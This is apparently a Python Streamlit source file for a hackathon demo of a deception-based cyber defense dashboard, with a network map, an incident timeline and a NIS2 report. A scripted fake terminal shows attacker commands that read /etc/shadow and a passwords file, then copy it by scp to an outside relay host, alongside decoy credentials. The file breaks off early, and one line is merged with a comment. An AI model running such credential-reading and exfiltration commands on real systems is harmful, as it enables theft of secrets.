"""
AEGIS AI - Systeme de Defense Active Cognitive
Hackathon Silicondays 2026 - Capgemini
Prototype de demonstration interactive
"""

import time
import random
from datetime import datetime, timedelta

import streamlit as st
import numpy as np
import pandas as pd
import plotly.graph_objects as go
import plotly.express as px

# ---------------------------------------------------------------------------
# Constants & palette
# ---------------------------------------------------------------------------
CAPGEMINI_BLUE = "#0070AD"
STEEL_BLUE = "#4682B4"
DARK_BG = "#0E1117"
CARD_BG = "#161B22"
RED_ALERT = "#FF4B4B"
ORANGE_WARN = "#FF8C00"
GREEN_OK = "#00C853"
CYAN_ACCENT = "#00D4FF"

# ---------------------------------------------------------------------------
# Page config
# ---------------------------------------------------------------------------
st.set_page_config(
    page_title="AEGIS AI - Cyber Defense",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded",
)

# ---------------------------------------------------------------------------
# Custom CSS
# ---------------------------------------------------------------------------
st.markdown(f"""
<style>
    /* Global */
    .stApp {{
        background-color: {DARK_BG};
    }}
    .block-container {{
        padding-top: 1rem;
    }}

    /* Header banner */
    .aegis-header {{
        background: linear-gradient(135deg, {CAPGEMINI_BLUE}22, {STEEL_BLUE}22);
        border: 1px solid {CAPGEMINI_BLUE}44;
        border-radius: 12px;
        padding: 1.2rem 2rem;
        margin-bottom: 1.5rem;
        text-align: center;
    }}
    .aegis-header h1 {{
        color: {CYAN_ACCENT};
        font-family: 'Courier New', monospace;
        font-size: 2rem;
        margin: 0;
        letter-spacing: 3px;
    }}
    .aegis-header p {{
        color: {STEEL_BLUE};
        font-size: 0.9rem;
        margin: 0.3rem 0 0 0;
    }}

    /* Metric cards in sidebar */
    .metric-card {{
        background: {CARD_BG};
        border: 1px solid {CAPGEMINI_BLUE}44;
        border-radius: 8px;
        padding: 0.8rem 1rem;
        margin-bottom: 0.6rem;
    }}
    .metric-card .label {{
        color: {STEEL_BLUE};
        font-size: 0.75rem;
        text-transform: uppercase;
        letter-spacing: 1px;
    }}
    .metric-card .value {{
        color: #FFFFFF;
        font-size: 1.4rem;
        font-weight: bold;
        font-family: 'Courier New', monospace;
    }}

    /* Alert card */
    .alert-card {{
        background: {RED_ALERT}15;
        border: 1px solid {RED_ALERT}66;
        border-radius: 8px;
        padding: 0.8rem 1rem;
        margin-bottom: 0.6rem;
    }}
    .alert-card .label {{
        color: {RED_ALERT};
        font-size: 0.75rem;
        text-transform: uppercase;
        letter-spacing: 1px;
    }}
    .alert-card .value {{
        color: {RED_ALERT};
        font-size: 1.4rem;
        font-weight: bold;
        font-family: 'Courier New', monospace;
    }}

    /* Terminal styling */
    .terminal {{
        background: #0D1117;
        border: 1px solid #30363D;
        border-radius: 8px;
        padding: 1rem;
        font-family: 'Courier New', monospace;
        font-size: 0.85rem;
        color: #00FF41;
        line-height: 1.6;
        max-height: 500px;
        overflow-y: auto;
    }}
    .terminal .prompt {{
        color: {RED_ALERT};
    }}
    .terminal .system {{
        color: {CYAN_ACCENT};
    }}
    .terminal .mirage {{
        color: {ORANGE_WARN};
    }}
    .terminal .info {{
        color: {STEEL_BLUE};
    }}

    /* Timeline */
    .timeline-event {{
        border-left: 3px solid {CAPGEMINI_BLUE};
        padding: 0.6rem 1rem;
        margin-bottom: 0.8rem;
        background: {CARD_BG};
        border-radius: 0 8px 8px 0;
    }}
    .timeline-event.critical {{
        border-left-color: {RED_ALERT};
        background: {RED_ALERT}10;
    }}
    .timeline-event.warning {{
        border-left-color: {ORANGE_WARN};
        background: {ORANGE_WARN}10;
    }}
    .timeline-event.success {{
        border-left-color: {GREEN_OK};
        background: {GREEN_OK}10;
    }}
    .timeline-event .time {{
        color: {STEEL_BLUE};
        font-family: 'Courier New', monospace;
        font-size: 0.8rem;
    }}
    .timeline-event .desc {{
        color: #C9D1D9;
        font-size: 0.9rem;
        margin-top: 0.2rem;
    }}

    /* NIS2 report */
    .nis2-report {{
        background: {CARD_BG};
        border: 1px solid {CAPGEMINI_BLUE}55;
        border-radius: 10px;
        padding: 1.5rem;
        font-family: 'Courier New', monospace;
        font-size: 0.85rem;
        color: #C9D1D9;
        line-height: 1.7;
    }}
    .nis2-report h3 {{
        color: {CAPGEMINI_BLUE};
        border-bottom: 1px solid {CAPGEMINI_BLUE}44;
        padding-bottom: 0.4rem;
    }}
    .nis2-report .field-label {{
        color: {STEEL_BLUE};
    }}
    .nis2-report .field-value {{
        color: #FFFFFF;
    }}
    .nis2-report .critical-tag {{
        color: {RED_ALERT};
        font-weight: bold;
    }}
    .nis2-report .ok-tag {{
        color: {GREEN_OK};
        font-weight: bold;
    }}

    /* Phase badges */
    .phase-badge {{
        display: inline-block;
        padding: 0.2rem 0.8rem;
        border-radius: 20px;
        font-size: 0.75rem;
        font-weight: bold;
        letter-spacing: 1px;
        margin-bottom: 1rem;
    }}
    .phase-avant {{
        background: {CAPGEMINI_BLUE}22;
        color: {CAPGEMINI_BLUE};
        border: 1px solid {CAPGEMINI_BLUE};
    }}
    .phase-pendant {{
        background: {RED_ALERT}22;
        color: {RED_ALERT};
        border: 1px solid {RED_ALERT};
    }}
    .phase-apres {{
        background: {GREEN_OK}22;
        color: {GREEN_OK};
        border: 1px solid {GREEN_OK};
    }}

    /* Tabs styling */
    .stTabs [data-baseweb="tab-list"] {{
        gap: 8px;
    }}
    .stTabs [data-baseweb="tab"] {{
        background-color: {CARD_BG};
        border-radius: 8px 8px 0 0;
        padding: 0.5rem 1.5rem;
        color: #C9D1D9;
    }}
    .stTabs [aria-selected="true"] {{
        background-color: {CAPGEMINI_BLUE}33;
        border-bottom: 2px solid {CAPGEMINI_BLUE};
    }}

    /* Latency indicator */
    .latency-box {{
        background: {ORANGE_WARN}15;
        border: 1px solid {ORANGE_WARN}66;
        border-radius: 8px;
        padding: 0.6rem 1rem;
        text-align: center;
        animation: pulse-orange 1.5s infinite;
    }}
    @keyframes pulse-orange {{
        0%, 100% {{ opacity: 1; }}
        50% {{ opacity: 0.6; }}
    }}

    /* Pulse animation for alerts */
    @keyframes pulse-red {{
        0%, 100% {{ box-shadow: 0 0 5px {RED_ALERT}44; }}
        50% {{ box-shadow: 0 0 20px {RED_ALERT}88; }}
    }}
    .pulse-alert {{
        animation: pulse-red 1s infinite;
    }}
</style>
""", unsafe_allow_html=True)

# ---------------------------------------------------------------------------
# Session state initialization
# ---------------------------------------------------------------------------
if "intrusion_active" not in st.session_state:
    st.session_state.intrusion_active = False
if "attack_phase" not in st.session_state:
    st.session_state.attack_phase = 0  # 0=idle, 1=detecting, 2=mirage, 3=isolated
if "terminal_lines" not in st.session_state:
    st.session_state.terminal_lines = []
if "nis2_generated" not in st.session_state:
    st.session_state.nis2_generated = False
if "attack_timestamp" not in st.session_state:
    st.session_state.attack_timestamp = None

# ---------------------------------------------------------------------------
# Data helpers
# ---------------------------------------------------------------------------

def build_network_nodes():
    """Return nodes & edges for the corporate network topology."""
    nodes = {
        "FW-01":       {"x": 0.5, "y": 1.0,  "type": "firewall",  "label": "Firewall\nPerimetre"},
        "SRV-WEB":     {"x": 0.2, "y": 0.75, "type": "server",    "label": "Serveur\nWeb"},
        "SRV-APP":     {"x": 0.5, "y": 0.75, "type": "server",    "label": "Serveur\nApp"},
        "SRV-DB":      {"x": 0.8, "y": 0.75, "type": "server",    "label": "Base de\nDonnees"},
        "AD-DC":       {"x": 0.35, "y": 0.5, "type": "critical",  "label": "Active\nDirectory"},
        "SRV-FILES":   {"x": 0.65, "y": 0.5, "type": "server",    "label": "Serveur\nFichiers"},
        "WS-ADMIN":    {"x": 0.15, "y": 0.25, "type": "endpoint",  "label": "Poste\nAdmin IT"},
        "WS-MKT-01":  {"x": 0.4, "y": 0.25, "type": "endpoint",  "label": "Poste\nMarketing 1"},
        "WS-MKT-02":  {"x": 0.6, "y": 0.25, "type": "endpoint",  "label": "Poste\nMarketing 2"},
        "WS-DEV":     {"x": 0.85, "y": 0.25, "type": "endpoint",  "label": "Poste\nDev"},
        "IOT-CAM":    {"x": 0.1, "y": 0.5,  "type": "iot",       "label": "Camera\nIP"},
        "IOT-PRINT":  {"x": 0.9, "y": 0.5,  "type": "iot",       "label": "Imprimante\nReseau"},
    }
    edges = [
        ("FW-01", "SRV-WEB"), ("FW-01", "SRV-APP"), ("FW-01", "SRV-DB"),
        ("SRV-WEB", "SRV-APP"), ("SRV-APP", "SRV-DB"),
        ("SRV-APP", "AD-DC"), ("SRV-APP", "SRV-FILES"),
        ("AD-DC", "WS-ADMIN"), ("AD-DC", "WS-MKT-01"),
        ("SRV-FILES", "WS-MKT-02"), ("SRV-FILES", "WS-DEV"),
        ("AD-DC", "IOT-CAM"), ("SRV-FILES", "IOT-PRINT"),
        ("WS-ADMIN", "IOT-CAM"),
    ]
    return nodes, edges


def get_node_color(node_id, node_info, intrusion_active, attack_phase):
    """Return color based on current state."""
    compromised = {"WS-MKT-01", "AD-DC", "SRV-FILES"}
    isolated = {"WS-MKT-01", "AD-DC"}
    lateral_path = {"WS-MKT-01", "AD-DC", "SRV-FILES"}

    if not intrusion_active:
        return CAPGEMINI_BLUE

    if attack_phase == 1:  # Detecting
        if node_id in lateral_path:
            return ORANGE_WARN
        return CAPGEMINI_BLUE

    if attack_phase >= 2:  # Mirage / Isolated
        if node_id in isolated:
            return RED_ALERT
        if node_id in compromised:
            return ORANGE_WARN
        return CAPGEMINI_BLUE

    return CAPGEMINI_BLUE


def get_node_symbol(node_info):
    """Return Plotly marker symbol for node type."""
    mapping = {
        "firewall": "diamond",
        "server": "square",
        "critical": "star",
        "endpoint": "circle",
        "iot": "triangle-up",
    }
    return mapping.get(node_info["type"], "circle")


def get_node_size(node_info):
    mapping = {
        "firewall": 22,
        "server": 18,
        "critical": 24,
        "endpoint": 14,
        "iot": 12,
    }
    return mapping.get(node_info["type"], 14)


def build_network_figure(intrusion_active, attack_phase):
    """Build the Plotly network topology figure."""
    nodes, edges = build_network_nodes()
    fig = go.Figure()

    # Edges
    for src, dst in edges:
        n1, n2 = nodes[src], nodes[dst]
        edge_color = "#30363D"
        edge_width = 1

        compromised_edges = {
            ("WS-MKT-01", "AD-DC"), ("AD-DC", "WS-MKT-01"),
            ("AD-DC", "SRV-FILES"), ("SRV-FILES", "AD-DC"),
            ("SRV-APP", "AD-DC"), ("AD-DC", "SRV-APP"),
        }

        if intrusion_active and attack_phase >= 1:
            if (src, dst) in compromised_edges or (dst, src) in compromised_edges:
                edge_color = RED_ALERT if attack_phase >= 2 else ORANGE_WARN
                edge_width = 2.5

        fig.add_trace(go.Scatter(
            x=[n1["x"], n2["x"]], y=[n1["y"], n2["y"]],
            mode="lines",
            line=dict(color=edge_color, width=edge_width),
            hoverinfo="none",
            showlegend=False,
        ))

    # Nodes
    for nid, info in nodes.items():
        color = get_node_color(nid, info, intrusion_active, attack_phase)
        border_color = "#FFFFFF" if color == RED_ALERT else color

        isolated_nodes = {"WS-MKT-01", "AD-DC"}
        opacity = 0.4 if (intrusion_active and attack_phase >= 3
                          and nid in isolated_nodes) else 1.0

        fig.add_trace(go.Scatter(
            x=[info["x"]], y=[info["y"]],
            mode="markers+text",
            marker=dict(
                size=get_node_size(info),
                color=color,
                symbol=get_node_symbol(info),
                line=dict(width=2, color=border_color),
                opacity=opacity,
            ),
            text=info["label"],
            textposition="bottom center",
            textfont=dict(size=9, color="#8B949E"),
            hovertext=f"<b>{nid}</b><br>Type: {info['type']}",
            hoverinfo="text",
            showlegend=False,
        ))

    # Isolation zone
    if intrusion_active and attack_phase >= 3:
        fig.add_shape(
            type="rect",
            x0=0.05, y0=0.15, x1=0.5, y1=0.6,
            line=dict(color=RED_ALERT, width=2, dash="dash"),
            fillcolor="rgba(255,75,75,0.03)",
        )
        fig.add_annotation(
            x=0.275, y=0.62,
            text="ZONE ISOLEE",
            font=dict(color=RED_ALERT, size=11, family="Courier New"),
            showarrow=False,
        )

    fig.update_layout(
        plot_bgcolor=DARK_BG,
        paper_bgcolor=DARK_BG,
        xaxis=dict(
            showgrid=False, zeroline=False, showticklabels=False,
            range=[-0.05, 1.05],
        ),
        yaxis=dict(
            showgrid=False, zeroline=False, showticklabels=False,
            range=[0.05, 1.1],
        ),
        margin=dict(l=10, r=10, t=10, b=10),
        height=420,
        hoverlabel=dict(bgcolor=CARD_BG, font_color="#C9D1D9"),
    )
    return fig


def build_risk_gauge(score):
    """Build a risk score gauge."""
    if score < 30:
        bar_color = GREEN_OK
    elif score < 70:
        bar_color = ORANGE_WARN
    else:
        bar_color = RED_ALERT

    fig = go.Figure(go.Indicator(
        mode="gauge+number",
        value=score,
        number=dict(suffix="%", font=dict(size=42, color="#FFFFFF")),
        gauge=dict(
            axis=dict(range=[0, 100], tickcolor="#30363D",
                      tickfont=dict(color="#8B949E")),
            bar=dict(color=bar_color, thickness=0.7),
            bgcolor=CARD_BG,
            bordercolor="#30363D",
            steps=[
                dict(range=[0, 30], color="rgba(0,200,83,0.08)"),
                dict(range=[30, 70], color="rgba(255,140,0,0.08)"),
                dict(range=[70, 100], color="rgba(255,75,75,0.08)"),
            ],
            threshold=dict(
                line=dict(color=RED_ALERT, width=3),
                thickness=0.8,
                value=80,
            ),
        ),
    ))
    fig.update_layout(
        paper_bgcolor=DARK_BG,
        plot_bgcolor=DARK_BG,
        height=250,
        margin=dict(l=30, r=30, t=30, b=10),
    )
    return fig


def build_confidence_budget_chart():
    """Build behavioral baseline chart."""
    hours = list(range(0, 24))
    np.random.seed(42)

    # Admin IT - mostly stable, slight deviations
    admin_baseline = [60 + 15 * np.sin(h / 3.8) for h in hours]
    admin_real = [v + np.random.uniform(-3, 5) for v in admin_baseline]

    # Marketing - normal usage pattern
    mkt_baseline = [30 + 25 * np.sin((h - 4) / 3.8) for h in hours]
    mkt_real = [v + np.random.uniform(-2, 4) for v in mkt_baseline]

    fig = go.Figure()

    # Admin traces
    fig.add_trace(go.Scatter(
        x=hours, y=admin_baseline, name="Admin IT - Baseline",
        line=dict(color=CAPGEMINI_BLUE, width=2, dash="dash"),
        opacity=0.7,
    ))
    fig.add_trace(go.Scatter(
        x=hours, y=admin_real, name="Admin IT - Reel",
        line=dict(color=CAPGEMINI_BLUE, width=2),
        fill="tonexty", fillcolor="rgba(0,112,173,0.06)",
    ))

    # Marketing traces
    fig.add_trace(go.Scatter(
        x=hours, y=mkt_baseline, name="Marketing - Baseline",
        line=dict(color=STEEL_BLUE, width=2, dash="dash"),
        opacity=0.7,
    ))
    fig.add_trace(go.Scatter(
        x=hours, y=mkt_real, name="Marketing - Reel",
        line=dict(color=STEEL_BLUE, width=2),
        fill="tonexty", fillcolor="rgba(70,130,180,0.06)",
    ))

    fig.update_layout(
        paper_bgcolor=DARK_BG, plot_bgcolor=DARK_BG,
        xaxis=dict(
            title="Heure", gridcolor="#21262D", tickcolor="#8B949E",
            title_font=dict(color="#8B949E"), tickfont=dict(color="#8B949E"),
        ),
        yaxis=dict(
            title="Budget Confiance (%)", gridcolor="#21262D",
            range=[0, 100],
            title_font=dict(color="#8B949E"), tickfont=dict(color="#8B949E"),
        ),
        legend=dict(font=dict(color="#8B949E", size=10),
                    bgcolor="rgba(22, 27, 34, 0.8)"), # <-- CORRECTION        height=320,
        margin=dict(l=50, r=20, t=20, b=50),
    )
    return fig


def build_confidence_budget_attack():
    """Build behavioral chart DURING attack showing anomaly."""
    hours = list(range(0, 24))
    np.random.seed(42)

    admin_baseline = [60 + 15 * np.sin(h / 3.8) for h in hours]
    admin_real = [v + np.random.uniform(-3, 5) for v in admin_baseline]

    mkt_baseline = [30 + 25 * np.sin((h - 4) / 3.8) for h in hours]
    mkt_real = list(mkt_baseline)
    # Inject anomaly at hours 14-17 (credential stuffing spike)
    for i in range(14, min(18, len(hours))):
        mkt_real[i] = mkt_baseline[i] + 35 + np.random.uniform(0, 10)

    fig = go.Figure()

    fig.add_trace(go.Scatter(
        x=hours, y=admin_baseline, name="Admin IT - Baseline",
        line=dict(color=CAPGEMINI_BLUE, width=2, dash="dash"), opacity=0.7,
    ))
    fig.add_trace(go.Scatter(
        x=hours, y=admin_real, name="Admin IT - Reel",
        line=dict(color=CAPGEMINI_BLUE, width=2),
        fill="tonexty", fillcolor="rgba(0,112,173,0.06)",
    ))
    fig.add_trace(go.Scatter(
        x=hours, y=mkt_baseline, name="Marketing - Baseline",
        line=dict(color=STEEL_BLUE, width=2, dash="dash"), opacity=0.7,
    ))
    fig.add_trace(go.Scatter(
        x=hours, y=mkt_real, name="Marketing - Reel (ANOMALIE)",
        line=dict(color=RED_ALERT, width=3),
        fill="tonexty", fillcolor="rgba(255,75,75,0.06)",
    ))

    # Anomaly annotation
    fig.add_vrect(x0=14, x1=17, fillcolor=RED_ALERT, opacity=0.08,
                  line_width=0)
    fig.add_annotation(x=15.5, y=95,
                       text="ANOMALIE DETECTEE",
                       font=dict(color=RED_ALERT, size=12,
                                 family="Courier New"),
                       showarrow=False)

    fig.update_layout(
        paper_bgcolor=DARK_BG, plot_bgcolor=DARK_BG,
        xaxis=dict(
            title="Heure", gridcolor="#21262D", tickcolor="#8B949E",
            title_font=dict(color="#8B949E"), tickfont=dict(color="#8B949E"),
        ),
        yaxis=dict(
            title="Budget Confiance (%)", gridcolor="#21262D",
            range=[0, 110],
            title_font=dict(color="#8B949E"), tickfont=dict(color="#8B949E"),
        ),
        legend=dict(font=dict(color="#8B949E", size=10),
                    bgcolor="rgba(22, 27, 34, 0.8)"),
        height=320,
        margin=dict(l=50, r=20, t=20, b=50),
    )
    return fig


TERMINAL_SEQUENCE = [
    ("system", "[AEGIS] Shadow Proxy active - Flux redirige vers Mirage Sandbox"),
    ("system", "[AEGIS] Latency Mimicry engage : injection +500ms"),
    ("system", "[AEGIS] Enregistrement forensique demarre..."),
    ("", ""),
    ("prompt", "attacker@compromised:~$ whoami"),
    ("output", "mkt-user01"),
    ("prompt", "attacker@compromised:~$ uname -a"),
    ("output", "Linux SRV-FILES 5.15.0-generic #1 SMP x86_64 GNU/Linux"),
    ("prompt", "attacker@compromised:~$ ls /etc/"),
    ("output", "passwd  shadow  hosts  hostname  resolv.conf  ssl/  ssh/"),
    ("prompt", "attacker@compromised:~$ cat /etc/shadow"),
    ("mirage", "[MIRAGE LLM] Generation de faux hashes en cours..."),
    ("output", "root:$6$xK9vQ2mZ$fAk3hAsH7rGn8Tq...truncated:19847:0:99999:7:::"),
    ("output", "admin:$6$pL4wN8rT$m1R4g3HaSh9Bx2...truncated:19847:0:99999:7:::"),
    ("output", "mkt-user01:$6$qW3eR5tY$d3c0YcOnT3nT...truncated:19847:0:99999:7:::"),
    ("prompt", "attacker@compromised:~$ cat /home/admin/passwords.txt"),
    ("mirage", "[MIRAGE LLM] Generation de faux credentials..."),
    ("output", "# Admin Password Vault - CONFIDENTIEL"),
    ("output", "aws_prod     : Xk9$mP2!vL7@nQ4w"),
    ("output", "db_master    : Rj5#hN8&bY3*fT6e"),
    ("output", "vpn_gateway  : Wm2%kD9!pA6^sG1c"),
    ("output", "ssh_bastion  : Qz7&nL4$vH8@jR5t"),
    ("prompt", "attacker@compromised:~$ scp passwords.txt ext-relay:/tmp/"),
    ("mirage", "[MIRAGE LLM] Simulation exfiltration - donnees tracees"),
    ("output", "passwords.txt    100%  412    52.1KB/s   00:00"),
    ("system", "[AEGIS] Exfiltration capturee - Hash de tracking injecte"),
    ("system", "[AEGIS] Fingerprint attaquant enregistre : TTP T1003, T1078, T1021"),
    ("", ""),
    ("prompt", "attacker@compromised:~$ ssh admin@AD-DC"),
    ("system", "[AEGIS] Tentative de deplacement lateral detectee"),
    ("system", "[AEGIS] ISOLATION DECLENCHEE - Noeuds WS-MKT-01, AD-DC coupes"),
    ("output", "ssh: connect to host AD-DC port 22: Connection refused"),
    ("system", "[AEGIS] Session Mirage terminee - Donnees forensiques sauvegardees"),
]


def get_terminal_html(lines):
    """Render terminal lines as styled HTML."""
    html = '<div class="terminal">'
    for kind, text in lines:
        if kind == "prompt":
            html += f'<div class="prompt">{text}</div>'
        elif kind == "system":
            html += f'<div class="system">{text}</div>'
        elif kind == "mirage":
            html += f'<div class="mirage">{text}</div>'
        elif kind == "output":
            html += f'<div>{text}</div>'
        elif kind == "" and text == "":
            html += "<br>"
    html += "</div>"
    return html


def build_attack_timeline():
    """Build incident timeline data."""
    base = datetime(2026, 3, 11, 14, 23, 12)
    events = [
        (base, "critical",
         "Credential Stuffing detecte sur SRV-WEB (43 tentatives / 10s)"),
        (base + timedelta(seconds=3), "critical",
         "Compromission reussie : compte mkt-user01 (mot de passe faible)"),
        (base + timedelta(seconds=8), "warning",
         "Score Rs passe de 12% a 67% - Seuil d'alerte atteint"),
        (base + timedelta(seconds=11), "warning",
         "Shadow Proxy active - Flux redirige vers Mirage Sandbox"),
        (base + timedelta(seconds=12), "warning",
         "Latency Mimicry engage (+500ms d'injection)"),
        (base + timedelta(seconds=18), "critical",
         "Deplacement lateral WS-MKT-01 -> AD-DC detecte (T1021)"),
        (base + timedelta(seconds=24), "warning",
         "Lecture /etc/shadow - Mirage LLM genere faux hashes"),
        (base + timedelta(seconds=31), "warning",
         "Lecture passwords.txt - Faux credentials injectes"),
        (base + timedelta(seconds=38), "critical",
         "Tentative exfiltration - Hash de tracking injecte dans payload"),
        (base + timedelta(seconds=45), "critical",
         "Score Rs atteint 94% - ISOLATION AUTOMATIQUE declenchee"),
        (base + timedelta(seconds=46), "success",
         "Noeuds WS-MKT-01 et AD-DC isoles du reseau"),
        (base + timedelta(seconds=47), "success",
         "Session Mirage terminee - Donnees forensiques sauvegardees"),
        (base + timedelta(seconds=52), "success",
         "Rapport NIS2 genere automatiquement"),
    ]
    return events


def get_nis2_report_html():
    """Generate formatted NIS2 compliance report."""
    return """
<div class="nis2-report">
<h3>RAPPORT D'INCIDENT NIS2 - AEGIS AI</h3>
<p style="color:#8B949E; font-size:0.8rem;">
Reference : AEGIS-INC-2026-0311-001 | Classification : CRITIQUE |
Genere automatiquement le 11/03/2026 a 14:24:04 UTC
</p>
<hr style="border-color:#30363D;">

<h3>1. IDENTIFICATION</h3>
<p><span class="field-label">Entite :</span>
   <span class="field-value">Capgemini - Division Cyber Defense</span></p>
<p><span class="field-label">Type d'incident :</span>
   <span class="critical-tag">Intrusion Active avec Deplacement Lateral</span></p>
<p><span class="field-label">Date de detection :</span>
   <span class="field-value">11/03/2026 14:23:12 UTC</span></p>
<p><span class="field-label">Duree totale :</span>
   <span class="field-value">52 secondes (detection a remédiation)</span></p>
<p><span class="field-label">Impact metier :</span>
   <span class="ok-tag">AUCUNE INTERRUPTION DE SERVICE</span></p>

<hr style="border-color:#30363D;">

<h3>2. PATIENT ZERO</h3>
<p><span class="field-label">Machine :</span>
   <span class="field-value">WS-MKT-01 (10.0.2.47)</span></p>
<p><span class="field-label">Compte compromis :</span>
   <span class="critical-tag">mkt-user01</span></p>
<p><span class="field-label">Vecteur initial :</span>
   <span class="field-value">Credential Stuffing via SRV-WEB (port 443)</span></p>
<p><span class="field-label">Cause racine :</span>
   <span class="field-value">
   Mot de passe faible, absence de MFA sur le portail marketing</span></p>

<hr style="border-color:#30363D;">

<h3>3. TTPs DETECTEES (MITRE ATT&CK)</h3>
<table style="width:100%; color:#C9D1D9; border-collapse:collapse;">
<tr style="border-bottom:1px solid #30363D;">
  <td style="padding:6px;"><b>T1110.004</b></td>
  <td style="padding:6px;">Credential Stuffing</td>
  <td style="padding:6px;"><span class="critical-tag">Initial Access</span></td>
</tr>
<tr style="border-bottom:1px solid #30363D;">
  <td style="padding:6px;"><b>T1078</b></td>
  <td style="padding:6px;">Valid Accounts</td>
  <td style="padding:6px;"><span class="critical-tag">Persistence</span></td>
</tr>
<tr style="border-bottom:1px solid #30363D;">
  <td style="padding:6px;"><b>T1021</b></td>
  <td style="padding:6px;">Remote Services (SSH)</td>
  <td style="padding:6px;"><span class="critical-tag">Lateral Movement</span></td>
</tr>
<tr style="border-bottom:1px solid #30363D;">
  <td style="padding:6px;"><b>T1003</b></td>
  <td style="padding:6px;">OS Credential Dumping</td>
  <td style="padding:6px;">Credential Access</td>
</tr>
<tr>
  <td style="padding:6px;"><b>T1048</b></td>
  <td style="padding:6px;">Exfiltration Over Alternative Protocol</td>
  <td style="padding:6px;">Exfiltration</td>
</tr>
</table>

<hr style="border-color:#30363D;">

<h3>4. ACTIONS AEGIS AUTOMATIQUES</h3>
<p><span class="ok-tag">&#10003;</span> Redirection vers Mirage Sandbox (Shadow Proxying L7)</p>
<p><span class="ok-tag">&#10003;</span> Injection de faux credentials (Mirage LLM Generatif)</p>
<p><span class="ok-tag">&#10003;</span> Injection de hash de tracking dans payload exfiltre</p>
<p><span class="ok-tag">&#10003;</span> Isolation reseau des noeuds WS-MKT-01 et AD-DC</p>
<p><span class="ok-tag">&#10003;</span> Capture forensique complete de la session attaquant</p>

<hr style="border-color:#30363D;">

<h3>5. RECOMMANDATIONS DE PATCHING IMMEDIAT</h3>

<p style="margin-top:0.8rem;"><b>FIREWALL (Priorite: CRITIQUE)</b></p>
<p><span class="field-value" style="font-size:0.82rem;">
iptables -A INPUT -s 10.0.2.0/24 -d 10.0.1.10 -p tcp --dport 22 -j DROP<br>
iptables -A INPUT -s 0.0.0.0/0 -p tcp --dport 443 -m connlimit --connlimit-above 10 -j REJECT
</span></p>

<p style="margin-top:0.8rem;"><b>IAM / Active Directory (Priorite: CRITIQUE)</b></p>
<p><span class="field-value" style="font-size:0.82rem;">
&bull; Forcer la reinitialisation du mot de passe pour mkt-user01<br>
&bull; Activer le MFA obligatoire sur tous les portails web exposes<br>
&bull; Appliquer une politique de mot de passe (min 14 car., complexite)<br>
&bull; Restreindre les connexions SSH inter-segments au strict necessaire
</span></p>

<p style="margin-top:0.8rem;"><b>MONITORING (Priorite: HAUTE)</b></p>
<p><span class="field-value" style="font-size:0.82rem;">
&bull; Ajouter une alerte SIEM pour > 10 echecs auth/10s par IP source<br>
&bull; Activer le logging SSH detaille sur AD-DC et SRV-FILES<br>
&bull; Deployer un EDR sur les endpoints du segment Marketing
</span></p>

<hr style="border-color:#30363D;">

<p style="text-align:center; color:#8B949E; font-size:0.8rem; margin-top:1rem;">
AEGIS AI - Rapport genere automatiquement | Conforme NIS2 Art. 23 |
Capgemini Cyber Defense 2026
</p>
</div>
"""


# ---------------------------------------------------------------------------
# Header
# ---------------------------------------------------------------------------
st.markdown("""
<div class="aegis-header">
    <h1>AEGIS AI</h1>
    <p>SYSTEME DE DEFENSE ACTIVE COGNITIVE &mdash; Capgemini Cyber Defense</p>
</div>
""", unsafe_allow_html=True)

# ---------------------------------------------------------------------------
# Sidebar - critical metrics
# ---------------------------------------------------------------------------
with st.sidebar:
    st.markdown(f"""
    <div style="text-align:center; padding:0.5rem 0 1rem 0;">
        <span style="color:{CYAN_ACCENT}; font-family:'Courier New'; font-size:1.1rem;
                     letter-spacing:2px;">
        AEGIS CONTROL
        </span>
    </div>
    """, unsafe_allow_html=True)

    is_attack = st.session_state.intrusion_active

    # Status
    if is_attack:
        st.markdown(f"""
        <div class="alert-card pulse-alert">
            <div class="label">STATUT SYSTEME</div>
            <div class="value">ALERTE ACTIVE</div>
        </div>
        """, unsafe_allow_html=True)
    else:
        st.markdown(f"""
        <div class="metric-card">
            <div class="label">STATUT SYSTEME</div>
            <div class="value" style="color:{GREEN_OK};">NOMINAL</div>
        </div>
        """, unsafe_allow_html=True)

    # Risk score
    rs = 94 if is_attack else 12
    rs_color = RED_ALERT if is_attack else GREEN_OK
    card_class = "alert-card" if is_attack else "metric-card"
    st.markdown(f"""
    <div class="{card_class}">
        <div class="label">SCORE DE RISQUE Rs</div>
        <div class="value" style="color:{rs_color};">{rs}%</div>
    </div>
    """, unsafe_allow_html=True)

    # Nodes monitored
    st.markdown(f"""
    <div class="metric-card">
        <div class="label">NOEUDS SURVEILLES</div>
        <div class="value">12 / 12</div>
    </div>
    """, unsafe_allow_html=True)

    # Isolated nodes
    isolated_count = 2 if is_attack and st.session_state.attack_phase >= 3 else 0
    iso_color = RED_ALERT if isolated_count > 0 else GREEN_OK
    st.markdown(f"""
    <div class="metric-card">
        <div class="label">NOEUDS ISOLES</div>
        <div class="value" style="color:{iso_color};">{isolated_count}</div>
    </div>
    """, unsafe_allow_html=True)

    # Mirage active
    mirage_status = "ACTIF" if is_attack and st.session_state.attack_phase >= 2 else "VEILLE"
    mirage_color = ORANGE_WARN if mirage_status == "ACTIF" else STEEL_BLUE
    st.markdown(f"""
    <div class="metric-card">
        <div class="label">MIRAGE GENERATIF</div>
        <div class="value" style="color:{mirage_color};">{mirage_status}</div>
    </div>
    """, unsafe_allow_html=True)

    # Latency injection
    if is_attack and st.session_state.attack_phase >= 2:
        st.markdown(f"""
        <div class="latency-box">
            <span style="color:{ORANGE_WARN}; font-family:'Courier New';
                         font-size:0.85rem;">
            INJECTION DE LATENCE ACTIVE<br>
            <b style="font-size:1.3rem;">+500ms</b>
            </span>
        </div>
        """, unsafe_allow_html=True)

    # Uptime
    st.markdown("""
    <div class="metric-card">
        <div class="label">UPTIME SERVICE METIER</div>
        <div class="value" style="color:#00C853;">99.97%</div>
    </div>
    """, unsafe_allow_html=True)

    st.markdown("---")
    st.markdown(f"""
    <div style="text-align:center; color:#8B949E; font-size:0.7rem;">
        AEGIS AI v2.1 &mdash; Silicondays 2026<br>
        Capgemini Cyber Defense
    </div>
    """, unsafe_allow_html=True)

# ---------------------------------------------------------------------------
# Main content - 3 tabs
# ---------------------------------------------------------------------------
tab_avant, tab_pendant, tab_apres = st.tabs([
    "AVANT : Sentinel & Baseline",
    "PENDANT : Riposte Active & Mirage",
    "APRES : Forensics & Rapport NIS2",
])

# ===== TAB 1 : AVANT =====
with tab_avant:
    st.markdown(
        '<span class="phase-badge phase-avant">PHASE 1 &mdash; SENTINEL MODE</span>',
        unsafe_allow_html=True,
    )

